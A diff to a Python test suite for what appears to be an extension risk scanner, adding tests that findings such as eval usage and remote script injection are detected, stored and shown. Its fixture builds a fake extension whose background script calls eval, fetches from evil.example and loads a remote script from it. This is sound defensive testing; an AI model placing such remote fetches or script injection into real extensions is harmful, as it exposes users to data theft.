@@ -38,6 +38,26 @@ def _fake_vsix() -> bytes:
     return buf.getvalue()
 
 
+def _risky_vsix() -> bytes:
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        zf.writestr("manifest.json", json.dumps({
+            "manifest_version": 2,
+            "name": "Risky Extension",
+            "version": "1.0.0",
+            "permissions": ["tabs", "debugger"],
+            "host_permissions": ["<all_urls>"],
+            "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *",
+        }))
+        zf.writestr(
+            "background.js",
+            "eval('alert(1)');\n"
+            "fetch('https://evil.example/data');\n"
+            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';\n",
+        )
+    return buf.getvalue()
+
+
 async def test_list_extensions_empty(client):
     r = await client.get("/api/extensions")
     assert r.status_code == 200
@@ -61,6 +81,87 @@ async def test_add_extension(client):
     assert data["extension_id"] == "testpub.test-ext"
     assert data["risk_score"] is not None
     return data["id"]
+
+
+async def test_add_extension_returns_and_persists_findings(client):
+    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
+        instance = MockFetcher.return_value
+        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))
+
+        r = await client.post("/api/extensions", json={
+            "store": "vscode",
+            "extension_id": "testpub.risky-ext",
+        })
+
+    assert r.status_code == 201
+    data = r.json()
+    codes = {finding["code"] for finding in data["findings"]}
+    assert {"eval_usage", "remote_fetch", "dynamic_script_injection", "manifest_v2"} <= codes
+
+    r2 = await client.get(f"/api/extensions/{data['id']}")
+    assert r2.status_code == 200
+    persisted_codes = {finding["code"] for finding in r2.json()["findings"]}
+    assert codes == persisted_codes
+
+
+async def test_old_package_analysis_without_findings_returns_empty(client, test_db, admin_user):
+    async with AsyncSession(test_db) as session:
+        ext = Extension(
+            user_id=admin_user.id,
+            store="vscode",
+            extension_id="testpub.old-ext",
+            name="Old Extension",
+            publisher="testpub",
+            version="1.0.0",
+            store_url="https://example.com",
+            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
+        )
+        session.add(ext)
+        await session.commit()
+        await session.refresh(ext)
+        ext_id = ext.id
+
+    r = await client.get(f"/api/extensions/{ext_id}")
+    assert r.status_code == 200
+    assert r.json()["findings"] == []
+
+
+async def test_extension_detail_renders_detection_findings(client):
+    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
+        instance = MockFetcher.return_value
+        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))
+        r = await client.post("/api/extensions", json={
+            "store": "vscode",
+            "extension_id": "testpub.ui-risky",
+        })
+    ext_id = r.json()["id"]
+
+    page = await client.get(f"/extensions/{ext_id}")
+    assert page.status_code == 200
+    assert b"Detection findings" in page.content
+    assert b"eval() usage" in page.content
+
+
+async def test_extension_detail_handles_old_package_analysis_without_findings(client, test_db, admin_user):
+    async with AsyncSession(test_db) as session:
+        ext = Extension(
+            user_id=admin_user.id,
+            store="vscode",
+            extension_id="testpub.old-ui",
+            name="Old UI Extension",
+            publisher="testpub",
+            version="1.0.0",
+            store_url="https://example.com",
+            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
+        )
+        session.add(ext)
+        await session.commit()
+        await session.refresh(ext)
+        ext_id = ext.id
+
+    page = await client.get(f"/extensions/{ext_id}")
+    assert page.status_code == 200
+    assert b"Detection findings" not in page.content
 
 
 async def test_add_extension_duplicate(client):
